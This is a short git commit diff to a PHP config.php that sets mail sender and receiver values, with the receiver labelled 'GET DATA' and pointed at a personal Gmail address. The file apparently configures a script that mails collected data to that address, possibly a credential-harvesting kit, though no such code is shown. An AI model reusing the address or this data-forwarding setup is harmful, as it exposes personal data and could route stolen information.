2865bb9e2ff4889c7c95eaec8340333a0598f052
ilyasahmadalmaki <36147933+ilyasahmadalmaki@users.noreply.github.com>
2021-10-27 15:04:14 +0700

    Update config.php

--- config.php
+++ config.php
@@ -4,7 +4,7 @@ $sender_name = 'name';
 $sender_mail = 'emai';
 $sender_pass = 'password';
 
-$receiver_name = 'name';
-$receiver_mail = 'emal';
+$receiver_name = 'GET DATA';
+$receiver_mail = 'ilyasaldota2@gmail.com';
 
 ?>
